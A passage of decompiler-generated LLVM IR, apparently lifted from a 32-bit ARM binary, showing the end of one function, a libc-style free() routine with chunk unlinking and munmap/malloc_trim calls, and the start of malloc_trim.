  store i32 %v1_1442c, i32* %r2.global-to-local, align 4
  %v1_14430 = add i32 %v0_14414, 52
  store i32 %v1_14430, i32* %ip.global-to-local, align 4
  %v2_14434 = add i32 %v0_14414, 840
  %v3_14434 = inttoptr i32 %v2_14434 to i32*
  store i32 0, i32* %v3_14434, align 4
  store i32 ptrtoint (i32* @global_var_10000.35 to i32), i32* %r3.global-to-local, align 4
  %v0_1443c = load i32, i32* %r0.global-to-local, align 4
  %v1_1443c = load i32, i32* @r4, align 4
  %v2_1443c = add i32 %v1_1443c, 836
  %v3_1443c = inttoptr i32 %v2_1443c to i32*
  store i32 %v0_1443c, i32* %v3_1443c, align 4
  %v0_14440 = load i32, i32* %r0.global-to-local, align 4
  %v1_14440 = load i32, i32* @r4, align 4
  %v2_14440 = add i32 %v1_14440, 844
  %v3_14440 = inttoptr i32 %v2_14440 to i32*
  store i32 %v0_14440, i32* %v3_14440, align 4
  %v1_14444 = load i32, i32* @r4, align 4
  %v2_14444 = add i32 %v1_14444, 852
  %v3_14444 = inttoptr i32 %v2_14444 to i32*
  store i32 ptrtoint (i32* @global_var_10000.35 to i32), i32* %v3_14444, align 4
  %v1_14448 = load i32, i32* @r4, align 4
  %v2_14448 = add i32 %v1_14448, 864
  %v3_14448 = inttoptr i32 %v2_14448 to i32*
  store i32 %v1_14428, i32* %v3_14448, align 4
  %v1_1444c = load i32, i32* @r4, align 4
  %v2_1444c = inttoptr i32 %v1_1444c to i32*
  store i32 %v1_1442c, i32* %v2_1444c, align 4
  %v0_14450 = load i32, i32* %ip.global-to-local, align 4
  %v1_14450 = load i32, i32* @r4, align 4
  %v2_14450 = add i32 %v1_14450, 44
  %v3_14450 = inttoptr i32 %v2_14450 to i32*
  store i32 %v0_14450, i32* %v3_14450, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v4_14458 = call i32 @sysconf(i32 30, i32 %v1_14428, i32 %v1_1442c, i32 ptrtoint (i32* @global_var_10000.35 to i32))
  store i32 %v4_14458, i32* @r0, align 4
  %v1_1445c = load i32, i32* @r4, align 4
  %v2_1445c = add i32 %v1_1445c, 860
  %v3_1445c = inttoptr i32 %v2_1445c to i32*
  store i32 %v4_14458, i32* %v3_1445c, align 4
  br label %dec_label_pc_14460

dec_label_pc_14460:                               ; preds = %dec_label_pc_143e8, %dec_label_pc_14414
  %v2_14464 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_14464, i32* @r4, align 4
  %v1_14468 = load i32, i32* @r0, align 4
  ret i32 %v1_14468

; uselistorder directives
  uselistorder i32 %v0_14414, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1440c, { 1, 0 }
  uselistorder i32 %v1_143f0, { 1, 0 }
  uselistorder i32 %v0_143dc, { 0, 2, 1 }
  uselistorder i32 %v0_143b8, { 1, 0 }
  uselistorder i32 %v1_14308, { 1, 0, 2 }
  uselistorder i32 %v0_14320, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_142e0, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16, 17, 15 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 12, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 3, 4, 5, 6, 7, 8, 9, 10, 2, 11, 12 }
  uselistorder i32* %lr.global-to-local, { 3, 0, 4, 2, 1, 5, 6 }
  uselistorder i32 860, { 2, 1, 0, 3 }
  uselistorder i32 30, { 1, 11, 2, 6, 3, 7, 4, 8, 0, 9, 10, 5, 12 }
  uselistorder label %dec_label_pc_14460, { 1, 0 }
  uselistorder label %dec_label_pc_143f8.dec_label_pc_143f8_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_143dc, { 1, 0 }
  uselistorder label %dec_label_pc_143a8, { 1, 0 }
  uselistorder label %dec_label_pc_1439c, { 1, 0 }
  uselistorder label %dec_label_pc_14398, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_14354, { 1, 0 }
}

define i32 @free() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_1446c = load i32, i32* @r4, align 4
  %v6_1446c = load i32, i32* @r5, align 4
  %v9_1446c = load i32, i32* @r6, align 4
  %v12_1446c = load i32, i32* @r7, align 4
  %v18_1446c = load i32, i32* @lr, align 4
  %v0_14474 = load i32, i32* @r0, align 4
  store i32 %v0_14474, i32* @r6, align 4
  %v2_14474 = icmp eq i32 %v0_14474, 0
  %v2_14478 = ptrtoint i32* %stack_var_-40 to i32
  store i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32* @r7, align 4
  br i1 %v2_14474, label %dec_label_pc_14680, label %dec_label_pc_14484

dec_label_pc_14484:                               ; preds = %entry
  store i32 108, i32* %r3.global-to-local, align 4
  %v4_14488 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 108) to i32*), align 4
  store i32 %v4_14488, i32* %r4.global-to-local, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 %v4_14488, i32* %r2.global-to-local, align 4
  %v4_14494 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 68) to i32*), align 4
  store i32 %v4_14494, i32* %r1.global-to-local, align 4
  store i32 %v2_14478, i32* %r0.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v4_144a0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 112) to i32*), align 4
  store i32 %v4_144a0, i32* %ip.global-to-local, align 4
  store i32 83116, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_144a0)
  %v0_144ac = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_144ac, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_144b4 = load i32, i32* @r7, align 4
  %v2_144b4 = add i32 %v0_144b4, 16
  %v3_144b4 = inttoptr i32 %v2_144b4 to i32*
  %v4_144b4 = load i32, i32* %v3_144b4, align 4
  store i32 %v4_144b4, i32* %ip.global-to-local, align 4
  store i32 83136, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_144b4)
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_144c4 = load i32, i32* @r7, align 4
  %v2_144c4 = add i32 %v0_144c4, 64
  %v3_144c4 = inttoptr i32 %v2_144c4 to i32*
  %v4_144c4 = load i32, i32* %v3_144c4, align 4
  store i32 %v4_144c4, i32* @lr, align 4
  %v0_144c8 = load i32, i32* @r6, align 4
  %v1_144c8 = add i32 %v0_144c8, -4
  %v2_144c8 = inttoptr i32 %v1_144c8 to i32*
  %v3_144c8 = load i32, i32* %v2_144c8, align 4
  store i32 %v3_144c8, i32* %r2.global-to-local, align 4
  %v1_144cc = inttoptr i32 %v4_144c4 to i32*
  %v2_144cc = load i32, i32* %v1_144cc, align 4
  store i32 %v2_144cc, i32* %r3.global-to-local, align 4
  %v1_144d0 = and i32 %v3_144c8, -4
  store i32 %v1_144d0, i32* %ip.global-to-local, align 4
  %v1_144d4 = add i32 %v0_144c8, -8
  store i32 %v1_144d4, i32* @r5, align 4
  store i32 %v1_144d4, i32* %r4.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_144d0, %v2_144cc
  br i1 %tmp, label %dec_label_pc_14504, label %dec_label_pc_144e4

dec_label_pc_144e4:                               ; preds = %dec_label_pc_14484
  %v1_144e4 = or i32 %v2_144cc, 3
  store i32 %v1_144e4, i32* %r3.global-to-local, align 4
  store i32 %v1_144e4, i32* %v1_144cc, align 4
  %v3_144e8 = load i32, i32* @lr, align 4
  %v4_144e8 = add i32 %v3_144e8, -8
  store i32 %v4_144e8, i32* %lr.global-to-local, align 4
  %v0_144ec = load i32, i32* %ip.global-to-local, align 4
  %v3_144ec = udiv i32 %v0_144ec, 8
  store i32 %v3_144ec, i32* %r1.global-to-local, align 4
  %v1_144f0 = add i32 %v3_144e8, -4
  store i32 %v1_144f0, i32* %r2.global-to-local, align 4
  %v4_144f4 = mul nuw i32 %v3_144ec, 4
  %v5_144f4 = add i32 %v4_144f4, %v1_144f0
  %v6_144f4 = inttoptr i32 %v5_144f4 to i32*
  %v7_144f4 = load i32, i32* %v6_144f4, align 4
  store i32 %v7_144f4, i32* %r3.global-to-local, align 4
  %v1_144f8 = load i32, i32* @r5, align 4
  %v2_144f8 = add i32 %v1_144f8, 8
  %v3_144f8 = inttoptr i32 %v2_144f8 to i32*
  store i32 %v7_144f4, i32* %v3_144f8, align 4
  %v0_144fc = load i32, i32* @r5, align 4
  %v1_144fc = load i32, i32* %r2.global-to-local, align 4
  %v2_144fc = load i32, i32* %r1.global-to-local, align 4
  %v5_144fc = mul i32 %v2_144fc, 4
  %v6_144fc = add i32 %v5_144fc, %v1_144fc
  %v7_144fc = inttoptr i32 %v6_144fc to i32*
  store i32 %v0_144fc, i32* %v7_144fc, align 4
  br label %dec_label_pc_14668

dec_label_pc_14504:                               ; preds = %dec_label_pc_14484
  %v1_14504 = and i32 %v3_144c8, 2
  %v2_14504 = icmp eq i32 %v1_14504, 0
  br i1 %v2_14504, label %dec_label_pc_1450c, label %dec_label_pc_14640

dec_label_pc_1450c:                               ; preds = %dec_label_pc_14504
  %v1_1450c = or i32 %v2_144cc, 1
  store i32 %v1_1450c, i32* %r3.global-to-local, align 4
  store i32 %v1_1450c, i32* %v1_144cc, align 4
  %v0_14514 = load i32, i32* @r6, align 4
  %v1_14514 = add i32 %v0_14514, -4
  %v2_14514 = inttoptr i32 %v1_14514 to i32*
  %v3_14514 = load i32, i32* %v2_14514, align 4
  store i32 %v3_14514, i32* %r3.global-to-local, align 4
  %v0_14518 = load i32, i32* @r5, align 4
  %v1_14518 = load i32, i32* %ip.global-to-local, align 4
  %v2_14518 = add i32 %v1_14518, %v0_14518
  store i32 %v2_14518, i32* %lr.global-to-local, align 4
  %v1_1451c = urem i32 %v3_14514, 2
  %v2_1451c = icmp eq i32 %v1_1451c, 0
  %v1_14520 = add i32 %v2_14518, 4
  %v2_14520 = inttoptr i32 %v1_14520 to i32*
  %v3_14520 = load i32, i32* %v2_14520, align 4
  store i32 %v3_14520, i32* %r8.global-to-local, align 4
  br i1 %v2_1451c, label %dec_label_pc_14528, label %dec_label_pc_1455c

dec_label_pc_14528:                               ; preds = %dec_label_pc_1450c
  %v1_14528 = add i32 %v0_14514, -8
  %v2_14528 = inttoptr i32 %v1_14528 to i32*
  %v3_14528 = load i32, i32* %v2_14528, align 4
  store i32 %v3_14528, i32* %r1.global-to-local, align 4
  %v2_1452c = sub i32 %v0_14518, %v3_14528
  store i32 %v2_1452c, i32* %r3.global-to-local, align 4
  %v1_14530 = add i32 %v2_1452c, 8
  %v2_14530 = inttoptr i32 %v1_14530 to i32*
  %v3_14530 = load i32, i32* %v2_14530, align 4
  store i32 %v3_14530, i32* %r2.global-to-local, align 4
  %v1_14534 = add i32 %v3_14530, 12
  %v2_14534 = inttoptr i32 %v1_14534 to i32*
  %v3_14534 = load i32, i32* %v2_14534, align 4
  store i32 %v3_14534, i32* %r4.global-to-local, align 4
  %v9_14538 = icmp eq i32 %v3_14534, %v2_1452c
  %v1_1453c = add i32 %v2_1452c, 12
  %v2_1453c = inttoptr i32 %v1_1453c to i32*
  %v3_1453c = load i32, i32* %v2_1453c, align 4
  store i32 %v3_1453c, i32* %r0.global-to-local, align 4
  br i1 %v9_14538, label %dec_label_pc_14544, label %dec_label_pc_145a8

dec_label_pc_14544:                               ; preds = %dec_label_pc_14528
  %v1_14544 = add i32 %v3_1453c, 8
  %v2_14544 = inttoptr i32 %v1_14544 to i32*
  %v3_14544 = load i32, i32* %v2_14544, align 4
  store i32 %v3_14544, i32* %r3.global-to-local, align 4
  %v9_14548 = icmp eq i32 %v3_14544, %v2_1452c
  br i1 %v9_14548, label %dec_label_pc_14550, label %dec_label_pc_145a8

dec_label_pc_14550:                               ; preds = %dec_label_pc_14544
  store i32 %v3_14530, i32* %v2_14544, align 4
  %v0_14554 = load i32, i32* %r0.global-to-local, align 4
  %v1_14554 = load i32, i32* %r2.global-to-local, align 4
  %v2_14554 = add i32 %v1_14554, 12
  %v3_14554 = inttoptr i32 %v2_14554 to i32*
  store i32 %v0_14554, i32* %v3_14554, align 4
  %v0_14558 = load i32, i32* %ip.global-to-local, align 4
  %v1_14558 = load i32, i32* %r1.global-to-local, align 4
  %v2_14558 = add i32 %v1_14558, %v0_14558
  store i32 %v2_14558, i32* %ip.global-to-local, align 4
  %v0_14568.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_1456c.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1455c

dec_label_pc_1455c:                               ; preds = %dec_label_pc_1450c, %dec_label_pc_14550
  %v0_145e8 = phi i32 [ %v1_14518, %dec_label_pc_1450c ], [ %v2_14558, %dec_label_pc_14550 ]
  %v0_1456c = phi i32 [ %v3_14520, %dec_label_pc_1450c ], [ %v0_1456c.pre, %dec_label_pc_14550 ]
  %v1_14580 = phi i32 [ %v2_14518, %dec_label_pc_1450c ], [ %v0_14568.pre, %dec_label_pc_14550 ]
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_14560 = load i32, i32* @r7, align 4
  %v2_14560 = add i32 %v0_14560, 64
  %v3_14560 = inttoptr i32 %v2_14560 to i32*
  %v4_14560 = load i32, i32* %v3_14560, align 4
  store i32 %v4_14560, i32* %r2.global-to-local, align 4
  %v1_14564 = add i32 %v4_14560, 44
  %v2_14564 = inttoptr i32 %v1_14564 to i32*
  %v3_14564 = load i32, i32* %v2_14564, align 4
  store i32 %v3_14564, i32* %r3.global-to-local, align 4
  %v9_14568 = icmp eq i32 %v1_14580, %v3_14564
  %v1_1456c = and i32 %v0_1456c, -4
  store i32 %v1_1456c, i32* %r0.global-to-local, align 4
  br i1 %v9_14568, label %dec_label_pc_145e8, label %dec_label_pc_14574

dec_label_pc_14574:                               ; preds = %dec_label_pc_1455c
  %v2_14574 = add i32 %v1_14580, %v1_1456c
  store i32 %v2_14574, i32* %r3.global-to-local, align 4
  %v1_14578 = add i32 %v2_14574, 4
  %v2_14578 = inttoptr i32 %v1_14578 to i32*
  %v3_14578 = load i32, i32* %v2_14578, align 4
  store i32 %v3_14578, i32* %r3.global-to-local, align 4
  %v1_1457c = urem i32 %v3_14578, 2
  %v2_1457c = icmp eq i32 %v1_1457c, 0
  %v2_14580 = add i32 %v1_14580, 4
  %v3_14580 = inttoptr i32 %v2_14580 to i32*
  store i32 %v1_1456c, i32* %v3_14580, align 4
  br i1 %v2_1457c, label %dec_label_pc_14588, label %dec_label_pc_14574.dec_label_pc_145b8_crit_edge

dec_label_pc_14574.dec_label_pc_145b8_crit_edge:  ; preds = %dec_label_pc_14574
  %v0_145c8.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_145b8

dec_label_pc_14588:                               ; preds = %dec_label_pc_14574
  %v0_14588 = load i32, i32* %lr.global-to-local, align 4
  %v1_14588 = add i32 %v0_14588, 8
  %v2_14588 = inttoptr i32 %v1_14588 to i32*
  %v3_14588 = load i32, i32* %v2_14588, align 4
  store i32 %v3_14588, i32* %r1.global-to-local, align 4
  %v1_1458c = add i32 %v3_14588, 12
  %v2_1458c = inttoptr i32 %v1_1458c to i32*
  %v3_1458c = load i32, i32* %v2_1458c, align 4
  store i32 %v3_1458c, i32* %r3.global-to-local, align 4
  %v9_14590 = icmp eq i32 %v3_1458c, %v0_14588
  %v1_14594 = add i32 %v0_14588, 12
  %v2_14594 = inttoptr i32 %v1_14594 to i32*
  %v3_14594 = load i32, i32* %v2_14594, align 4
  store i32 %v3_14594, i32* %r2.global-to-local, align 4
  br i1 %v9_14590, label %dec_label_pc_1459c, label %dec_label_pc_145a8

dec_label_pc_1459c:                               ; preds = %dec_label_pc_14588
  %v1_1459c = add i32 %v3_14594, 8
  %v2_1459c = inttoptr i32 %v1_1459c to i32*
  %v3_1459c = load i32, i32* %v2_1459c, align 4
  store i32 %v3_1459c, i32* %r3.global-to-local, align 4
  %v9_145a0 = icmp eq i32 %v3_1459c, %v0_14588
  br i1 %v9_145a0, label %dec_label_pc_145ac, label %dec_label_pc_145a8

dec_label_pc_145a8:                               ; preds = %dec_label_pc_14588, %dec_label_pc_14544, %dec_label_pc_14528, %dec_label_pc_1459c
  %v0_145a8 = call i32 @abort()
  store i32 %v0_145a8, i32* %r0.global-to-local, align 4
  %v0_145ac.pre = load i32, i32* @r1, align 4
  %v1_145ac.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_145ac

dec_label_pc_145ac:                               ; preds = %dec_label_pc_1459c, %dec_label_pc_145a8
  %v1_145ac = phi i32 [ %v3_14594, %dec_label_pc_1459c ], [ %v1_145ac.pre, %dec_label_pc_145a8 ]
  %v0_145ac = phi i32 [ %v3_14588, %dec_label_pc_1459c ], [ %v0_145ac.pre, %dec_label_pc_145a8 ]
  %v2_145ac = add i32 %v1_145ac, 8
  %v3_145ac = inttoptr i32 %v2_145ac to i32*
  store i32 %v0_145ac, i32* %v3_145ac, align 4
  %v0_145b0 = load i32, i32* %r2.global-to-local, align 4
  %v1_145b0 = load i32, i32* %r1.global-to-local, align 4
  %v2_145b0 = add i32 %v1_145b0, 12
  %v3_145b0 = inttoptr i32 %v2_145b0 to i32*
  store i32 %v0_145b0, i32* %v3_145b0, align 4
  %v0_145b4 = load i32, i32* %ip.global-to-local, align 4
  %v1_145b4 = load i32, i32* %r0.global-to-local, align 4
  %v2_145b4 = add i32 %v1_145b4, %v0_145b4
  store i32 %v2_145b4, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_145b8

dec_label_pc_145b8:                               ; preds = %dec_label_pc_14574.dec_label_pc_145b8_crit_edge, %dec_label_pc_145ac
  %v0_145c8 = phi i32 [ %v0_145c8.pre, %dec_label_pc_14574.dec_label_pc_145b8_crit_edge ], [ %v2_145b4, %dec_label_pc_145ac ]
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_145bc = load i32, i32* @r7, align 4
  %v2_145bc = add i32 %v0_145bc, 64
  %v3_145bc = inttoptr i32 %v2_145bc to i32*
  %v4_145bc = load i32, i32* %v3_145bc, align 4
  %v1_145c0 = add i32 %v4_145bc, 52
  store i32 %v1_145c0, i32* %r3.global-to-local, align 4
  %v1_145c4 = add i32 %v4_145bc, 60
  %v2_145c4 = inttoptr i32 %v1_145c4 to i32*
  %v3_145c4 = load i32, i32* %v2_145c4, align 4
  store i32 %v3_145c4, i32* %r1.global-to-local, align 4
  %v1_145c8 = or i32 %v0_145c8, 1
  store i32 %v1_145c8, i32* %r2.global-to-local, align 4
  %v1_145cc = load i32, i32* %r4.global-to-local, align 4
  %v2_145cc = add i32 %v1_145cc, 12
  %v3_145cc = inttoptr i32 %v2_145cc to i32*
  store i32 %v1_145c0, i32* %v3_145cc, align 4
  %v0_145d0 = load i32, i32* %r1.global-to-local, align 4
  %v1_145d0 = load i32, i32* %r4.global-to-local, align 4
  %v2_145d0 = add i32 %v1_145d0, 8
  %v3_145d0 = inttoptr i32 %v2_145d0 to i32*
  store i32 %v0_145d0, i32* %v3_145d0, align 4
  %v0_145d4 = load i32, i32* %r2.global-to-local, align 4
  %v1_145d4 = load i32, i32* %r4.global-to-local, align 4
  %v2_145d4 = add i32 %v1_145d4, 4
  %v3_145d4 = inttoptr i32 %v2_145d4 to i32*
  store i32 %v0_145d4, i32* %v3_145d4, align 4
  %v0_145d8 = load i32, i32* %ip.global-to-local, align 4
  %v1_145d8 = load i32, i32* %r4.global-to-local, align 4
  %v3_145d8 = add i32 %v1_145d8, %v0_145d8
  %v4_145d8 = inttoptr i32 %v3_145d8 to i32*
  store i32 %v0_145d8, i32* %v4_145d8, align 4
  %v0_145dc = load i32, i32* %r4.global-to-local, align 4
  %v1_145dc = load i32, i32* %r1.global-to-local, align 4
  %v2_145dc = add i32 %v1_145dc, 12
  %v3_145dc = inttoptr i32 %v2_145dc to i32*
  store i32 %v0_145dc, i32* %v3_145dc, align 4
  %v0_145e0 = load i32, i32* %r4.global-to-local, align 4
  %v1_145e0 = load i32, i32* %r3.global-to-local, align 4
  %v2_145e0 = add i32 %v1_145e0, 8
  %v3_145e0 = inttoptr i32 %v2_145e0 to i32*
  store i32 %v0_145e0, i32* %v3_145e0, align 4
  br label %dec_label_pc_145f8

dec_label_pc_145e8:                               ; preds = %dec_label_pc_1455c
  %v2_145e8 = add i32 %v1_1456c, %v0_145e8
  store i32 %v2_145e8, i32* %ip.global-to-local, align 4
  %v1_145ec = or i32 %v2_145e8, 1
  store i32 %v1_145ec, i32* %r3.global-to-local, align 4
  %v0_145f0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_145f0, i32* %v2_14564, align 4
  %v0_145f4 = load i32, i32* %r3.global-to-local, align 4
  %v1_145f4 = load i32, i32* %r4.global-to-local, align 4
  %v2_145f4 = add i32 %v1_145f4, 4
  %v3_145f4 = inttoptr i32 %v2_145f4 to i32*
  store i32 %v0_145f4, i32* %v3_145f4, align 4
  br label %dec_label_pc_145f8

dec_label_pc_145f8:                               ; preds = %dec_label_pc_145b8, %dec_label_pc_145e8
  %v0_145f8 = load i32, i32* %ip.global-to-local, align 4
  %v3_145fc = icmp ult i32 %v0_145f8, 131070
  br i1 %v3_145fc, label %dec_label_pc_14668, label %dec_label_pc_14600

dec_label_pc_14600:                               ; preds = %dec_label_pc_145f8
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_14604 = load i32, i32* @r7, align 4
  %v2_14604 = add i32 %v0_14604, 64
  %v3_14604 = inttoptr i32 %v2_14604 to i32*
  %v4_14604 = load i32, i32* %v3_14604, align 4
  store i32 %v4_14604, i32* @r4, align 4
  %v1_14608 = inttoptr i32 %v4_14604 to i32*
  %v2_14608 = load i32, i32* %v1_14608, align 4
  store i32 %v2_14608, i32* %r3.global-to-local, align 4
  %v1_1460c = and i32 %v2_14608, 2
  %v2_1460c = icmp eq i32 %v1_1460c, 0
  br i1 %v2_1460c, label %bb16, label %bb

bb:                                               ; preds = %dec_label_pc_14600
  store i32 %v4_14604, i32* %r0.global-to-local, align 4
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_14600, %bb
  %v1_14614 = xor i1 %v2_1460c, true
  call void @__pseudo_cond_branch(i1 %v1_14614, i32 ptrtoint (i32* @global_var_142b8.613 to i32))
  %v0_14618 = load i32, i32* @r4, align 4
  %v1_14618 = add i32 %v0_14618, 44
  %v2_14618 = inttoptr i32 %v1_14618 to i32*
  %v3_14618 = load i32, i32* %v2_14618, align 4
  store i32 %v3_14618, i32* %r3.global-to-local, align 4
  %v1_1461c = add i32 %v3_14618, 4
  %v2_1461c = inttoptr i32 %v1_1461c to i32*
  %v3_1461c = load i32, i32* %v2_1461c, align 4
  store i32 %v3_1461c, i32* %r3.global-to-local, align 4
  %v1_14620 = add i32 %v0_14618, 836
  %v2_14620 = inttoptr i32 %v1_14620 to i32*
  %v3_14620 = load i32, i32* %v2_14620, align 4
  store i32 %v3_14620, i32* %r2.global-to-local, align 4
  %v1_14624 = and i32 %v3_1461c, -4
  store i32 %v1_14624, i32* %r3.global-to-local, align 4
  %v3_14628 = icmp ult i32 %v1_14624, %v3_14620
  br i1 %v3_14628, label %dec_label_pc_14668, label %dec_label_pc_14630

dec_label_pc_14630:                               ; preds = %bb16
  store i32 %v0_14618, i32* %r1.global-to-local, align 4
  %v1_14634 = add i32 %v0_14618, 840
  %v2_14634 = inttoptr i32 %v1_14634 to i32*
  %v3_14634 = load i32, i32* %v2_14634, align 4
  store i32 %v3_14634, i32* %r0.global-to-local, align 4
  %v2_14638 = call i32 @__malloc_trim(i32 %v3_14634, i32 %v0_14618)
  store i32 %v2_14638, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14668

dec_label_pc_14640:                               ; preds = %dec_label_pc_14504
  %v2_14640 = inttoptr i32 %v1_144d4 to i32*
  %v3_14640 = load i32, i32* %v2_14640, align 4
  store i32 %v3_14640, i32* %r0.global-to-local, align 4
  %v1_14644 = add i32 %v4_144c4, 848
  %v2_14644 = inttoptr i32 %v1_14644 to i32*
  %v3_14644 = load i32, i32* %v2_14644, align 4
  store i32 %v3_14644, i32* %r2.global-to-local, align 4
  %v1_14648 = add i32 %v4_144c4, 868
  %v2_14648 = inttoptr i32 %v1_14648 to i32*
  %v3_14648 = load i32, i32* %v2_14648, align 4
  %v2_1464c = add i32 %v3_14640, %v1_144d0
  store i32 %v2_1464c, i32* %r1.global-to-local, align 4
  %v1_14650 = add i32 %v3_14644, -1
  store i32 %v1_14650, i32* %r2.global-to-local, align 4
  %v2_14654 = sub i32 %v3_14648, %v2_1464c
  store i32 %v2_14654, i32* %r3.global-to-local, align 4
  store i32 %v2_14654, i32* %v2_14648, align 4
  %v1_1465c = load i32, i32* @lr, align 4
  %v2_1465c = add i32 %v1_1465c, 848
  %v3_1465c = inttoptr i32 %v2_1465c to i32*
  store i32 %v1_14650, i32* %v3_1465c, align 4
  %v0_14660 = load i32, i32* %r0.global-to-local, align 4
  %v1_14660 = load i32, i32* @r5, align 4
  %v2_14660 = sub i32 %v1_14660, %v0_14660
  store i32 %v2_14660, i32* %r0.global-to-local, align 4
  %v4_14664 = call i32 @munmap(i32 %v2_14660, i32 %v2_1464c, i32 %v1_14650, i32 %v2_14654)
  store i32 %v4_14664, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14668

dec_label_pc_14668:                               ; preds = %bb16, %dec_label_pc_145f8, %dec_label_pc_14630, %dec_label_pc_144e4, %dec_label_pc_14640
  store i32 %v2_14478, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r1, align 4
  store i32 44, i32* %r3.global-to-local, align 4
  %v0_14674 = load i32, i32* @r7, align 4
  %v2_14674 = add i32 %v0_14674, 44
  %v3_14674 = inttoptr i32 %v2_14674 to i32*
  %v4_14674 = load i32, i32* %v3_14674, align 4
  store i32 %v4_14674, i32* %ip.global-to-local, align 4
  store i32 83584, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_14674)
  br label %dec_label_pc_14680

dec_label_pc_14680:                               ; preds = %entry, %dec_label_pc_14668
  store i32 %v3_1446c, i32* @r4, align 4
  store i32 %v6_1446c, i32* @r5, align 4
  store i32 %v9_1446c, i32* @r6, align 4
  store i32 %v12_1446c, i32* @r7, align 4
  store i32 %v18_1446c, i32* @lr, align 4
  ret i32 %v2_14478

; uselistorder directives
  uselistorder i32 %v0_14618, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_145d8, { 1, 0 }
  uselistorder i32 %v1_14518, { 1, 0 }
  uselistorder i32 %v0_14518, { 1, 0 }
  uselistorder i32 %v3_144ec, { 1, 0 }
  uselistorder i32 %v1_144d0, { 1, 0, 2 }
  uselistorder i32 %v2_144cc, { 1, 2, 0, 3 }
  uselistorder i32 %v4_144c4, { 1, 0, 2, 3 }
  uselistorder i32 %v0_14474, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i32* %r0.global-to-local, { 0, 4, 1, 2, 3, 7, 5, 6, 13, 14, 8, 9, 10, 12, 11 }
  uselistorder i32* %lr.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %ip.global-to-local, { 0, 5, 1, 6, 2, 7, 4, 3, 8, 9, 10, 11, 12, 13 }
  uselistorder i32 868, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 68) to i32*), { 0, 2, 3, 4, 1 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 108) to i32*), { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_14680, { 1, 0 }
  uselistorder label %dec_label_pc_14668, { 4, 2, 0, 1, 3 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %dec_label_pc_145f8, { 1, 0 }
  uselistorder label %dec_label_pc_145b8, { 1, 0 }
  uselistorder label %dec_label_pc_145ac, { 1, 0 }
  uselistorder label %dec_label_pc_145a8, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1455c, { 1, 0 }
}

define i32 @function_14690(i32 %arg1) local_unnamed_addr {
dec_label_pc_14690:
  %v0_14690 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14690, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_14690
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_14690, %bb
  %v4_146a4 = phi i32 [ %arg1, %dec_label_pc_14690 ], [ 0, %bb ]
  ret i32 %v4_146a4

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @malloc_trim(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v3_146a8 = load i32, i32* @r4, align 4
  store i32 %v3_146a8, i32* %stack_var_-12, align 4
  %v6_146a8 = load i32, i32* @r5, align 4
